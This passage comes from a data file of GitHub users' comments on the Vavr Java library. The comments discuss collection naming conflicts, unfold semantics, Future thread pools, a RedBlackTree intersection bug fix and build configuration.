purposes you should use the maven-enforcer-plugin. See https://maven.apache.org/enforcer/enforcer-rules/requireMavenVersion.html\ndisplayed by Maven 3.5.0 disappear.. Great! Eactly what I requested in https://github.com/vavr-io/vavr/issues/2035. formatting error ;) :). ",
    "miszasty93": "2058 . Wow, my bad :( Now everything is ok ;).",
    "JordanMartinez": "@danieldietrich Thank you for the response! I'll respond inline.\n\nI'm the creator of Vavr / Javaslang, I might be too biased to give an objective comparison.\n\nThat may be, but it also helps to hear from the mind(s) that designed and implemented the project, wouldn't you agree?\n\nI think you can compare the relation fj/vavr to scalaz/scala. Several of fj's initiators are scalaz comitters, e.g. Runar.\n\nHelpful analogy. Thanks!\n\nIt is my understanding that fj targets effect-free programming by encoding states using types. You need to know some bits of the algebraic methodology. For example (streaming) IO effects may be abstracted using transducers, getters/setters may be used in a functional way using lenses and so on.\nI've experienced that Java is not the right language to do these abstractions. It is technically possible but it is bulky and has significant performance impacts. Also, in Java several things can't be expressed, it seems we have to stop half the way (missing higher kinded types, no tail recursion, no lazy evaluated values, etc).\n\nI read through a book on Haskell recently, so I understand (at least at a primitive level :wink:) algebraic datatypes (ADTs). However, I agree about the bulkiness of it all. For example (and not to bash on FJ, but..) how can one use FJ's Tuples (P1, P2, P3, etc.) to simulate these ADTs without the code getting completely confusing since one cannot use type aliases (an issue in Java and Groovy alike). Extending P2 (e.g. class Person extends P2<String, Integer> { /* name, age */ }) wouldn't work well because their getters wouldn't be named according to their fields; reading it later would be a difficult task. Creating my own named Tuple2 class class Person { String name, int age } would require isomorphism to turn it into FJ-compatible P2<String, Integer>, but that feels like it would turn into boilerplate at some point.\nI believe Groovy has tail recursion, but not higher-kinded types. I'm not sure about the lazy evaluated values (though it seems FJ already has that...?).\n\nDuring the creation of Vavr's Vector we made benchmarks. FJ's solution is more than 100x slower for some operations. However, if you want to be able to mathematically proof the correctness of (parts of) your application, fj is the way to go.\n\nFJ seems slower due to using non-primitive types for primitive types, but is that still the case when using non-primitive types? Is FJ actually faster because they can use their FingerTree implementation? I didn't find that data structure in this library, but I'm not sure if you're using one internally either.\n\nVavr intends to give you some bits of functional programming without ~breaking the Java programming model~ moving too far away from standard Java. I will elaborate on it soon, a blog post is in the make...\n\nI look forward to reading that blog post! Could you post its link in this issue when you finish writing it, so that I can be notified of it?\n\nPlease also see https://www.quora.com/What-is-Scalaz-useful-for\n\nHelpful. Thanks again!\n\nComparing libraries is such a delicate matter, especially if one is involved :sweat_smile:\n\nI agree and will end by saying that both libraries are powerful and very helpful for adding support for what is lacking in the Java language itself. \n@hepin1989 I agree. My first problem is just understanding the pros/cons of each. My second problem is learning what it would look like for me to use either library in my project, and finally deciding which to use based on what meshes with my personal tastes.. I think this has answered my question, so I'm closing it (forgot to earlier, sorry!).\nThanks for the feedback!. ",
    "zlangbert": "As someone who is using vavr across multiple code bases, it would be disappointing to see the collections renamed. When we went all in on vavr, conflicts tended to be a non-issue as we rarely needed to import java.util.* anyway. And if I did need both, I can live with fully qualifying java.util.List occasionally. \nI think the argument for retaining recognizable type names is very strong as well. In a team setting, getting developers to buy into a new collections library is hard enough, and if someone unfamiliar couldn't recognize any of the types, that would be a hard sell. I think moving away from familiarity for a library like this would greatly hurt adoption.\nAdding a collections library definitely has some interesting choices, I think the path you are already on is a solid one. We love the safety and elegance vavr brings to Java. Thanks for the awesome library!. ",
    "andreasaronsson": "As I am working on growing the vavr user base in our company the most salient (and valid IMO) concern is that users may make mistakes when they think they are using a java.util.List but in fact are using a io.vavr.List. This is especially important for developers not familiar with anything but imperative. \nI am following the fqdn-for-JUL-collections recommendation and that seems to take the edge off concerns but not enough to douse the flames entirely. \nChanging to io.vavr.vList vs java.util.List or similar would be fine with me. Not sure if that will silence critics entirely though. \nHope this helps even though not conclusive in any way :-). This video might give a hint as to where the JDK is heading in the future in this regard. Example of 'common way'  @danieldietrich mentioned. \nhttps://youtu.be/E1RXMCQ7k9g\nAlso very interesting! :-). ",
    "a1730": "Daniel,\nThank you for an awesome library. I have been using it to learn functional Java without the theory barrier presented by Scala - Thank you.\nI do not have a huge code base on Vavr but I believe avoiding the name conflict will be better in the long run. Why not take a leaf from the pCollection guys, and simply prepend a v (vavr) to the collections library?\nList -> VList e.t.c as proposed by @andreasaronsson?\n. ",
    "alwins0n": "just want to mention that I love the brevity of Seq, Set, List, Map. It makes the code more elegant to return Seq instead of Collection as opposed to before.\nIn our codebase (which is a rather small one!) we managed to almost get rid of java.util imports since there is jackson and spring-jpa support for vavr anyway.\nI think, if you choose to use vavr it fundamentally changes development - since it is used as a core library or not at all. Furthermore you would want to avoid mixing juCollections and vavrCollections any ay. As it becomes a replacement for juC we don't mind possible name clashes.\nOne more important thing: It should be considered that some people come to vavr from Scala or are educating themselves about FP via Scala courses (e.g. the Odersky one on coursera). For these people it is VERY helpful that vavr follows the naming conventions of Scala! . It is the scala way. Since vavr is greatly influenced by scala it makes sense to leave it like that. hmm now that i think of it, maybe the members could be named \"first\", \"second\" and so on with respective getters. also since they have a map1and put1 etc they should have a get1...?. thanks for mentioning this. I recently noticed some issues like this which essentially capture one big question for the vavr future - that is: should vavr be \"scala for java devs\" or \"a fp library for java (with lessons learned from scala)\"\nupdate stems from the scala world and dependent on this very fundamental question (which is possible to decide once and for all with 1.0.0) it can be changed or not - in my opinion.\nI will open another issue one of these days where I will collect issues that relate to this question to bring some movement/decision for vavr 1.0.0 as I am also very interested on where the journey will go. exactly. if this decision is already made - it should be communicated in all the issues to avoid these discussions and I will refrain from creating an issue on this.. Is it mentioned though? There is no hint to scala on the vavr readme oder contributing.md. It says \"object functional library\" everywhere. Issues like this will pop up every now and then, which is good on principle, I agree, but pointless if there is some undocumented fundamental decision that prevents changes like this.. ",
    "stephenh": "I'm starting to use vavr on an existing codebase, and the FQCNs for java/vavr List are not great (though I do generally agree with vavr keeping the List name as is).\nFWIW a nice hack that I got used to with jOOQ was using Seq for everything, b/c Seq doesn't overlap with any existing Java collections.\nI'd like to do this with vavr as well, but there is no Seq.ofAll or Seq.range, so I end up stuck using a FQCN List merely to get at the factory methods.\nGranted, there is API.Seq(...), but only for T and T....\nSo, if the API could have Seq shortcuts for most of the List factory methods, I think that would go along way towards my \"just use Seq\" compromise.\nIs that doable/reasonable?. Makes sense; I'll (...re-) articulate a 3rd opinion: make converting between the two (JVM List and Vavr List) in mixed code easier.\nE.g. I invariably end up with java.util.List imported (legacy/mixed code), so it \"wins\" the List.factoryMethod namespace (and ofAll is too generic to import as a static method), so in every project I use vavr on, I end up with a VavrUtils that is:\njava\n  /** Shortcut since API.SeqOfAll does not exist. */\n  public static <T> Seq<T> Seq(Iterable<T> list) {\n    return io.vavr.collection.List.ofAll(list);\n  }\nMore generically, once java.util.List is imported, I don't know of an easy (specifically succinct) way to convert a java List into a vavr List/Seq to get all the nice methods that I want.\nI thought the API.FactoryMethod idiom as a nice way around that, but it seems incomplete, e.g. does have not methods for Iterable<T>.\n...in retrospect, this is probably a separate issue (flushing out API factory methods), and basically exactly what I said ~a year ago, so it is probably not that helpful; but I guess the context is \"this is a specific pain point (not being able to access the List.ofAll factory methods in mixed code) that made me want 'different names'\". Solving that pain point, of easily accessible factory methods, makes the same name issue less annoying (and, FWIW, I totally agree with your resolution of leaving as-is).\n. Thanks for the response! Yeah, understood on the API.Seq(...) overload ambiguities; would be great to do API.Seq(javaList) if it wasn't for that as then static import of API would solve everything.\nAPI.SeqOfAll(javaList) matches Seq.ofAll / List.ofAll pretty closely but isn't as slick...\nI really like API.toVavr, and I think, for me, that would solve this particular \"conversion when List is already taken\" pain point really well.\nScala's Seq has probably ruined me but I'm even tempted by API.vavr because in the midst of a code block, when I want to do a quick vavr(list).map(...).toList(), the extra few characters between toVavr and vavr \"counts\", as the whole reason I'm bringing in Vavr in the 1st place is to have the pleasant succinctness of things like .toList() instead of .collect(toList()) and friends. ...granted, that is probably too extreme, but FWIW.. ",
    "hrzafer": "Initially, I liked all the features that vavr presents. But as soon as I realized that the List is not the java.util.List, it was a big turn off for me. My suggestion is using v prefix for any vavr type that has a name conflict with the standard java correspondence.  Like VList or Vlist or vList. . ",
    "Dangercoder": "@hrzafer  same here. We won't use the collection-part of vavr because of this (or sparingly.). ",
    "RazvanPetruescu": "There is absolutely no reason for which a generic List should be named VList or Vlist or vList. \nThis denotes poor style, to say the least.\nA serious software engineer (unlike some that bother to spam this thread) might think that VList is a List that has some sort of V characteristic. \nUnless V is an encoding that is descriptive for a well-understood domain (which is not the case here, as we are talking about a generic collection), why bother?\nA type is a type, whose name should be self-descriptive, precise, and denote what it abstracts over, and encoding information about the namespace in which the type resides (for example), in the type name, is bad practice.\nThis reminds me about the stupid debates (that are still going on, seems like) about the usefullness of hungarian notation in statically typed languges.\nThe fact that other collection libraries chose to do something like this, is irellevant.\n@danieldietrich we appreciate the fact that you took the time to understand our opinion. Seeing you the professional that you are, we believe you are going to make the right decision and ignore all this nonsense. Specifically, you can ignore @hrzafer and @Dangercoder in particular, not only because their proposal is unsound, but also b/c they did not bother to argument their position (\"it was a big turn off for me\" is not an argument in this situation).. ",
    "majorpasza": "background: I started using vavr some time ago, mostly on my own projects and a little bit on production.\nI don't think that this name clash is any serious issue. I very rarely now have a codebase where java.util.List and vavr List are used together, I simply replace all java.util with vavr counterparts and tell my IntelliJ not to suggest imports for collections from java.util.\nAlso, I find the static api like List() to be really compelling and so do people I work with.\nList() is better than ImmutableVavrList() for me :)\nHaving said that, I vote to stay with current naming as this IMO is not a problem at all.\nThe more serious problem is rather that all Java ecosystem uses standard java.util collection and vavr counterparts diverge there and it is kind of cumbersome to insert .toJavaXXX and List(javaish) everywhere. But I don't think that there is sound solution to that at the moment.\ndisclaimer: Might been doing things wrong, but I'm still exploring vavr. Nonetheless I find it awesome!. ",
    "zyxist": "Great to see another project that considers using modules :). Consider also using the recommended naming for modules:\n\nModule names must be reverse-DNS, just like package names, e.g. org.joda.time.\nModules are a group of packages. As such, the module name must be related to the package names.\nModule names are strongly recommended to be the same as the name of the super-package.\nCreating a module with a particular name takes ownership of that package name and everything beneath it.\nAs the owner of that namespace, any sub-packages may be grouped into sub-modules as desired so long as no package is in two modules.\n\nUsing reverse-DNS style is recommended by Mark Reinhold, chief Java architect, and there is a good explanation written by Stephen Colebourne, one of Java experts:\n\nhttp://blog.joda.org/2017/04/java-se-9-jpms-module-naming.html\nhttps://github.com/jodastephen/jpms-module-names. \n",
    "smillies": "I see an additional problem with unfoldRight/Left that you might fix in this context: The documentation says:\n\nThe function should return None when it's done generating the Vector, otherwise Some Tuple of the value to add to the resulting Vector and the element for the next call.\n\nHowever, the examples use the tuple exactly the other way around: it is the first element that controls the recursion and the second that gets added. I believe that is a bug, the documentation says how it should be - at least when you take established standards from other languages such as Haskell as the benchmark.\n(I do understand why it is more convenient in Java to have the seed first and the function second - although other than in Haskell - but  I can see no reason for the different interpretation of the tuple.). There are a couple of points to keep in mind with that idea of having a predicate-based version of unfoldRight/Left.\n\nIt totally destroys the duality of the type signature to fold (which is already somewhat obfuscated by fold being an instance method and unfold being static, as well as relying on some type equivalences). This is more of an aesthetic concern, I think a note in the Javadocs would suffice.\nYou must fix a meaning for the predicate: either as a termination condition, or a condition to enter recursion. In your partial function formulation, the natural extension of the predicate would be the domain of the function, i. e. it would mean \"go on\". You should then perhaps change the examples for the existing methods, which use a \"stop\" condition to return Option.none(), so as to avoid confusion.\nI think you would have to test the predicate on the last pair that is returned. If you don't have some \"undefined\" value as one of the Tuple elements, it might be difficult to put the last desired value into the list, or perhaps the predicates may have to be different (b > 0 with Optional, b >= 0 with Predicate). This can probably be handled, but will complicate the implementation. The nice thing about Option is that it can stand-in when there is no natural way to construct a \"terminating tuple\".. Here's another thought that makes a predicate-based version of unfoldRight questionable, in particular one where the predicate is hidden in a partial function. The point has to do with reusing existing functions in an unfold operation. Such pre-existing functions usually will not return a tuple. The code that constructs the pair for unfold will somehow be extra. In addition, many legitimate use cases for unfold decide how to proceed by looking at the result of the function, not just its previous input. In a predicate-based unfoldRight, this may require double computations of the function.\n\nConsider the following (rather contrived) example. It's not Vavr, but my own toy example, but it should serve to illustrate the point. The output of unfoldRight in this example is supposed to be the one-element list [\"even\"].\nFunction<Integer,String> expensive = i -> i % 2 == 0 ? \"even\" : \"odd\"; // long-running pre-existing function\nFunction<String,Pair<String,Integer>> nextTuple = s -> \"odd\".equals(s) ? pair(s,2) : pair(s,1);  // cons the string in the result, use 2 or 1 as next input\nPredicate<String> continueWhile = s -> \"even\".equals(s); // examine result of long-running function\n// repeated computation of expensive function with predicate-based version\nunfoldrP(nextTuple.compose(expensive), i -> continueWhile.test(expensive.apply(i)), 10);\nWith a utility function, you can convert the Predicate to an Optional, so that the result of the function can be shared:\n```\nFunction>> predicateToOption(Predicate pred, Function> f);\n// single computation of expensive function with option-based version\nunfoldr(predicateToOption(continueWhile, nextTuple.compose(expensive)), 10);\n```\nI think instead of having the predicate-based unfoldr in Vavr, it would be more useful to have such a utility function, along the lines of\nstatic <T, R> Function<T, Optional<Pair<R, T>>> predicateToOption(Predicate<R> pred, Function<T, Pair<R, T>> f) {\n        return x -> {\n            Pair<R, T> p = f.apply(x);\n            return pred.test(p.first()) ? Optional.of(p) : Optional.empty();\n        };\n    }\n. Thank you. I will try IntelliJ then. . Attached patch:\nfuture-patch.zip\n. ForkJoinPool threads are all daemon threads. FJP is also work-stealing, meaning less contention on the queue, so it is a good choice under heavy load or when recursive tasks keep creating more tasks. However, loading everything off to the common FJP pool that is shared across the entire VM is likely to cause unpredictable behavior. (At my company, for example, we do not use Stream.parallel() for exactly that reason.) \nCurrently Vavr Future uses a CachedThreadPool. That basically has a task queue size of 0 and spawns new threads for each incoming task, killing them after a while. The problem is, it doesn't know when to stop creating more threads, and the default configuration has no limit. That makes it a bit unsuitable for computation-intensive tasks, it's better for short-lived tasks. As you don't know what kinds of tasks to expect in general, maybe one should move away from it.\nA fixed thread pool would probably not be dynamic enough, especially in the recursive cases.\nIn sum, I would tend to use a ForkJoinPool, but not the common one, but one created with Executors.newWorkStealingPool(). (So forget my patch that started this issue.). @danieldietrich: Well, I did originally recommend to switch to Executors.newWorkStealingPool(), because I didn't like the idea of a VM-wide globally shared pool.  You never know what it's going to be used for, and if someone makes the mistake of submitting blocking tasks, threads in the common FJP can be made inactive. This is more of a feeling, however, not really an argument.\nOn the other hand, using ForkJoinPool.commonPool() has the advantage of being both the simplest and the \"expected\" thing, in the sense that other async constructs in Java default to that as well (e. g. CompletableFuture). \nSo finally I agree that as a first step, ForkJoinPool.commonPool() is a reasonable choice. Experience will then show what features need to be added.. relaxing the type signatures to Function1<T1, ? extends Future<? extends R>> -> Function<T1,Future<R>> seems a good idea, although that will require a cast in the short-circuiting clause of MemoizedConcurrently.\nBut I do not see what you gain by introducing all those factory methods. In what way is writing fibMem = Function1.memoized(this::fib) any prettier than fibMem = MemoizedConcurrently.of(this::fib) ?\nAnd you can keep a separate module for the concurrent stuff.. @danieldietrich (Off-topic) I haven't looked at Kotlin coroutines in-depth. However, as Kotlin coroutines require a new keyword (suspend) that makes the Kotlin compiler issue special bytecode (see here), I don't think you can pull this in easily without pulling in a compile-time dependency on Kotlin. As a library user, I wouldn't like that. \nApart from suspend, the rest seems to be Kotlin library code, not language constructs. The context switching seems to be done by the Kotlin CoroutineDispatcher. Something of how concurrency and threads work is explained in the Coroutines Guide and Informal Description document. These links may be outdated.\n. Oh yes, and I believe you do not want a varant of MemoizedConcurrentlly.of() that accepts an ExecutorService. The async call in the memoizer is only for trampolining, it it weren't for that, you might just as well call the underlying function directly. For trampolining, I think you'll be fine with Future's default ForkJoinPool. A sensible alternative would be to create a dedicated newSingleThreadExecutor for each instance of ConcurrentTrampoliningMemoizer, although that might become wasteful when there are very many memoized functions. I think the opportunity to pass in a trampoline might potentially create more harm than good. Perhaps experience will show otherwise later, but I wouldn't do it now.. What you do want is a variant of MemoizedConcurrentlly.of() that accepts a cache implementation: that's why  the constructor of ConcurrentTrampoliningMemoizer has a ConcurrentMap argument in the first place. The memo might take up a lot of memory for intermediate results that might become unneeded. I'd like people to be able to pass in a real cache that has some sort of expiry policy, as a replacement for the ConcurrentHashMap in the default implementation.. Hi there, I've gone and created a pull request. Changes compared to the original proposal: MemoizedConcurrently has an additional method that accepts a cache implementation, and ConcurrentTrampoliningMemoizer is hidden (package private).\nRegards,\nSebastian. I have closed the pull request, because the code used Promise, which has been removed meanwhile.\nWithout Promise, I currently see no good way to implement this functionality. It could be implemented in terms of CompletableFuture, as in the original version on my blog, but then there's no good way to go from a Function1 that produces a vavr.io.concurrent.Future to a Function that produces a CompletableFuture and back.\n(And Future.fromCompletableFuture() cannot be used, because it blocks.). I will close the pull request from GitHub, because it does not compile anymore with the demise of Promise in #2093. Don't worry, I'm not feeling let down at all. I appreciate all the hard work you're putting into this library. (Four kids - happy you. We were four at home as well.). ",
    "johnw42": "Who wants commentary from random strangers? You do! I hope so, anyway.\nDefining an unfold operation in terms of the PartialFunction type seems questionable to me, because at the very least, it replaces one virtual function call with two. I guess it's all right as an alternative, but I suspect it wouldn't see a lot of use, because it will be hard to implement PartialFunction without either duplicating a bunch of logic in both apply() and isDefined(), or doing something gross like memoizing.\nI think the real fix (which I hope it's on Oracle's roadmap) would be to optimize the JVM so returning an Optional instance doesn't allocate any memory. (Or better yet, make it so returning a new instance of any final class with a small number of members doesn't allocate memory, but I won't hold my breath on that).\nHave you done any benchmarking to see what the actual impact is of returning Optional instances? It seems like a textbook example of the kind of problem generational garbage collectors were invented to solve.. ",
    "dx-pbuckley": "I think this is what you were asking for, let me know if it looks correct.. Ah, I see your point about not modifying the appendix in the LICENSE. I was using another OSS project's copy of the Apache-2.0 LICENSE file as a guide, and they had replaced the text within brackets, modifying the appendix.\nIf I was to change all the Java file headers, would you want to keep both the large format ascii with VAVR.io and the small font for the header/comment with the Apache content, or some variation of that?\njava\n/*                        __    __  __  __    __  ___\n *                       \\  \\  /  /    \\  \\  /  /  __/\n *                        \\  \\/  /  /\\  \\  \\/  /  /\n *                         \\____/__/  \\__\\____/__/.\u026a\u1d0f\n * \u1d9c\u1d52\u1d56\u02b8\u02b3\u1da6\u1d4d\u02b0\u1d57 \u1d47\u02b8 \u1d5b\u1d43\u1d5b\u02b3 \u207b \u02e1\u1da6\u1d9c\u1d49\u207f\u02e2\u1d49\u1d48 \u1d58\u207f\u1d48\u1d49\u02b3 \u1d57\u02b0\u1d49 \u1d43\u1d56\u1d43\u1d9c\u02b0\u1d49 \u02e1\u1da6\u1d9c\u1d49\u207f\u02e2\u1d49 \u1d5b\u1d49\u02b3\u02e2\u1da6\u1d52\u207f \u1d57\u02b7\u1d52 \u1d48\u1d52\u1d57 \u1dbb\u1d49\u02b3\u1d52\n *   Copyright 2014-2017 Vavr, http://vavr.io\n *\n *   Licensed under the Apache License, Version 2.0 (the \"License\");\n *   you may not use this file except in compliance with the License.\n *   You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n *   Unless required by applicable law or agreed to in writing, software\n *   distributed under the License is distributed on an \"AS IS\" BASIS,\n *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *   See the License for the specific language governing permissions and\n *   limitations under the License.\n */. ",
    "amygithub": "Great to hear, Daniel! I was worried that backward compatibility would be an issue, so good to see you're biting the bullet. I hadn't even realised that there was an open issue about what I changed.. Hi @danieldietrich , have you had a chance to look at this yet?. Hi @danieldietrich. I've moved the classes now, so should be ready for review.. Hi Daniel,\nSo this was the main decision I made in this change: that all methods that could be used in one fluent block should have the same return type.\nThe main problem I had when trying to use Vavr validation for nested fields was that sometimes a single error was returned, and sometimes a sequence of errors. This meant that I as a user had to seriously think about how to combine these nested fields: I ended up creating terribly unreadable code, as the business logic (of methods of validation for each field) was inextricably mixed up in low-level logic like fold, bimap, etc.\nI created a very simple test, \"shouldCreateSuccessNestedCombine()\", to illustrate the kind of nested mapping I wanted to simplify. If validation of a set of fields relies on the content of another field, it's very easy to get lost in the code, if you have to map between multiple return \ntypes. http://www.baeldung.com/vavr mentions this issue.\nAn example of nested validation is when a customer selects their company type, (which itself is validated), and depending on this type, we either validate their address, or date of birth.\nWith the change I made, this becomes trivial to do.. ",
    "grimimirg": "Hello @smillies, if you still be interested on Eclipse, actually I'm still developing with Eclipse Java EE IDE for Web Developers, version: Oxygen.3 Release (4.7.3) in the same way you described and still don't have problems (try to check you Eclipse version if it's the same of mine, if this could help you). Hi @danieldietrich thank you for your answer! I'll proceed like that.. ",
    "mxj4": "@nfekete tryComplete call complete only when isCompleted() is false, and the isCompleted() check is synchronized so complete from another thread cannot happen concurrently with the check.. @danieldietrich can you enlighten me on how would tryComplete throw IllegalStateException? And does fix the API spec mean you plan to make it not throw in 1.0?. @danieldietrich It's still useful in some cases. Currently I use ScheduledExecutorService with it to implement timeout for vavr Future.. ",
    "roberterdin": "The empty node has BLACK color so the RED node in question should have empty children and thus black-height 1.\nI suspect the problem is with one of the building blocks of the intersection algorithm like join/split. Will dig up my old algorithms and data structures text book.... I played around with it a bit yesterday and noticed a few things.\n1) It happens hardly ever. I ran\n```java\n        IntStream.iterate(0, i -> i)\n                .parallel()\n                .unordered()\n                .forEach(i -> {\n                    Random r = ThreadLocalRandom.current();\n                    List s1 = List.fill(r.nextInt(6), () -> r.nextInt(15));\n                    List s2 = List.fill(r.nextInt(6), () -> r.nextInt(15));\n                    final RedBlackTree t1 = RedBlackTree.ofAll(Integer::compare, s1);\n                    final RedBlackTree t2 = RedBlackTree.ofAll(Integer::compare, s2);\n                try {\n                    t1.intersection(t2);\n                }catch (ClassCastException ex){\n                    System.out.println(\"t1: \" + t1);\n                    System.out.println(\"t2: \" + t2);\n                }\n            });\n\n```\nFor > 10\u2079 iterations and it did not happen. I ran it again without random tree size, i.e. a tree with size 5 intersected with a tree with size 2, which is when it happens in the above example. There the error happened after 200 odd million iterations. \n2)  https://github.com/vavr-io/vavr/blob/master/vavr/src/main/java/io/vavr/collection/RedBlackTree.java#L639\nThis creates trees with incorrect black-heights.  It creates Non-empty nodes with black-height 0 which should not be possible, right?\nIt is not necessarily the source of the error but probably also something worth investigating.\n3)  A \u2229 B = A - (A - B), which would be slow but also an easy fix.. I think I found the issue. The wrong black-heights cause the joinLT and joinGT to fail.\n\n\nThe call you can see should end up in the if statement but instead ends up in the else which causes the exception. Haven't had time to look at why these heights are wrong. Just wanted to prevent you from investigating something that's not relevant.\nedit:\nRemoving the -1 here https://github.com/vavr-io/vavr/blob/master/vavr/src/main/java/io/vavr/collection/RedBlackTree.java#L639 seems to fix the issue. Might introduce new bugs or incorrect trees though ;) (Also as far as I can tell it is there in the original code... my Haskell is non-existent though)\nedit2: don't think removing the -1 is a good idea... check the provided fix instead\n. Please verify if https://github.com/roberterdin/vavr/commit/0a564fe3a607d6647566e7136c31ada79d0a2693 fixes it.. I think I finally got it. There is a + 1 missing for the black height at https://github.com/vavr-io/vavr/blob/master/vavr/src/main/java/io/vavr/collection/RedBlackTree.java#L747\nAre you sure your tests are correct? I get shouldPassIntersectionRegression1: \"(B:8 (B:7 R:0) (B:14 R:9))\", your TODO says \"(B:8 (B:7 R:0) (B:14 R:0))\" but I reckon that's a typo?\n. How does it differ from Scala's vector?. ",
    "nhinds": "If Processor.process throws an exception, I don't think it can be passed to Optional.map because Optional.map takes a java.util.Function, and a java.util.Function isn't allowed to throw checked exceptions. . ",
    "SimY4": "Having a look at it, do you think its a good idea to introduce EitherT and OptionT types to transform Eithers and Options inside any Value? Similar to what scalaz library provides.\nSo for example if you have a Future> you can wrap it in EitherT and work the way you would work with regular Either. and then just extract the underlying Value.. @danieldietrich Thanks for looking into this issue.\nBy Stream I was actually thinking of java.util.stream.Stream and not the vavr stream. But still, it has the same thing that you have to break out of the stream transformation chain to sequence Either types.\nYou've suggested\nsequenceEither(\n    Stream.of(1, 2, 3).map(i -> Either.right(\"Some result\"))\n);\nWhich I found very inconvenient to write. Once you realize that you're dealing with a stream of eithers you have to wrap the whole thing in a static method for conversion. \nIf you have a look at how you express something similar in scala (with additional help from Scalaz or cats syntax extensions):\n```\nscala> import cats.implicits.\nimport cats.implicits.\nscala> val a = List(1, 2, 3).map(Either.right(_)).sequence\na: Either[Nothing,List[Int]] = Right(List(1, 2, 3))\nYou can see that I'm appending sequence at the end of my transformation chain. And we can do exactly that in java APIs by using java util stream collectors. The API may start to look like:\nEither> result = Stream.of(1, 2, 3).map(i -> Either.right(\"Some result\")).collect(Either.sequenceRight());\n```. @danieldietrich I experimented with java.util.stream.Collector a little and I think it's quite possible.\nHere's an example of Collector for Option.flatten:\n```\n        java.util.stream.Stream> stream = java.util.stream.Stream.of(\n                Option.of(1),\n                Option.none(),\n                Option.of(2),\n                Option.none(),\n                Option.of(3)\n        );\n    java.util.stream.Collector<Integer, ArrayList<Integer>, List<Integer>> vavrCollector = List.collector();\n    java.util.stream.Collector<Option<Integer>, ?, List<Integer>> flattenCollector = java.util.stream.Collector.of(\n            vavrCollector.supplier(),\n            (acc, option) -> option.forEach(a -> vavrCollector.accumulator().accept(acc, a)),\n            vavrCollector.combiner(),\n            vavrCollector.finisher()\n    );\n\n    List<Integer> flatten = stream.collect(flattenCollector);\n    // List(1, 2, 3)\n\nFor either case it's a little bit more complex but still doable:\n        java.util.stream.Stream> stream = java.util.stream.Stream.of(\n                Either.right(1),\n                Either.right(2),\n                Either.right(3)\n        );\n    // unfortunately collector accumulator is an effectful action.\n    // In order to mutate either we need a mutable variable.\n    class Ref<A> {\n        A ref;\n\n        Ref(A ref) { this.ref = ref; }\n    }\n\n    java.util.stream.Collector<Integer, ArrayList<Integer>, List<Integer>> vavrCollector = List.collector();\n    java.util.stream.Collector<Either<Object, Integer>, ?, Either<Object, List<Integer>>> sequenceCollector = java.util.stream.Collector.of(\n            () -> new Ref<>(Either.right(vavrCollector.supplier().get())),\n            (ref, either) -> ref.ref = ref.ref.flatMap(arr -> either.map(ev -> {\n                vavrCollector.accumulator().accept(arr, ev);\n                return arr;\n            })),\n            (refL, refR) -> new Ref<>(refL.ref.flatMap(rv -> refR.ref\n                    .map(lv -> vavrCollector.combiner().apply(rv, lv)))),\n            ref -> ref.ref.map(vavrCollector.finisher())\n    );\n\n    Either<Object, List<Integer>> sequence = stream.collect(sequenceCollector);\n    // Right(List(1, 2, 3))\n\n```. If I understand you correctly you want to set vscUrl for each module independently. To do that you can set a variable in each gradle module file:\nin vavr-control/gradle.build\n```\next.moduleVcsUrl = 'https://github.com/vavr-io/vavr-control.git'\n... // the rest of gradle file\n```\nand in the main gradle build file you refer to it:\nin gradle.build\n...\nbintray {\n  vcsUrl = moduleVcsUrl\n}. @danieldietrich You can extract common properties in a gradle.properties file that you can put next to your top build.gradle file. It'll be automatically picked up and all properties from it will be shared across all sub projects.\nsample gradle.properties\n```\ngroup = io.vavr\nversion = 1.0.0-SNAPSHOT\nprojectDescription = Awesome description\nprojectUrl = https://github.com/vavr-io/vavr\nprojectScm = scm:git:https://github.com/vavr-io/vavr\nprojectIssues = https://github.com/vavr-io/vavr/issues\n```\nthen in your gradle file you can omit setting group and version for every module because it'll be picked up from properties file. It'll also give a single source of truth for common configuration options.\nRegarding version number. I don't know anything that worked similarly to maven-release-plugin. So I just update my version in gradle.properties file then run publish, commit, add necessary tags and then do another version bump. Everything manually.. Instead of using Void type to represent the absence of valuable output you can use Tuple0.\nThe difference between Void and Tuple0 is that Void has no instances (apart from null, the use of which is error prone) and Tuple0 has exactly one instance. You can think of Tuple0 as a null-safe alternative to Void.. ",
    "KTannenberg": "As a side effect it results in class-cast exception when elements are not naturally sortable and init/last is called on SortedSet. This is expected behavior however :). @danieldietrich, regarding old min/max in TreeSet, these were using RedBlackTreeModule's min/max and thus were very fast. Probably to ensure there would be no performance hit from using Traversable.maxBy it would be better to implement last/head inside TreeSet.. @mrpotes\nSuggestion with adding generic type wouldn't work well, as once you start to combine these functions together you will end up with Exception or Throwable just because in Java it is not possible to deduce resulting type (union of exception X1 and its subtypes with exception X2 and its subtypes) of exception that can be thrown.\nAs for catching Throwable in Checked* this is mostly because Vavr closely resembles behaviour of Scala's Try. Cyclops requires you to explicitly define all exceptions that can be throw by your code below, because of that they  don't need java to figure out types on its own.\nI can agree, that catching Throwable is simple in Scala because it doesn't have silly concept of checked/unchecked exceptions, so you just deal with these Throwable subtypes you do care and let other stuff be rethrown.\nUnfortunately there are libraries that misuse Errors and use them in places where some Exception should have been used.. I'm not saying that Cyclops did anything wrong, in fact this is probably easiest, most user-friendly and reliable solution that they choose for their version of `Try.\nAlso there is nothing like \"everybody should everything the way it is done in scala\", in fact scala have a lot of problems as well. Why I was mentioning scala in a first place is because initially javaslang (previous name of vavr) was heavily inspired by scala's std library.. ",
    "atsu85": "What is the plan with this issue? \nI came here to find out if Findbugs/Checkstyle integration is supported (forgetting to assign the result of method invocation, that will return new immutable object instead of modifying it).\nPerhaps this issue should be renamed to smth like \"Findbugs/Checkstyle integration\"?. ",
    "briangoetz": "People always start out excited about annotations; the return-on-effort for that first tap of the annotation hammer is usually positive.  As Daniel points out, they very quickly reach a point of negative returns for multiple reasons, including the lack of credible abstraction for annotations, and because they're not part of the type system (and therefore any inheritance semantics are completely tool-specific.)  . ",
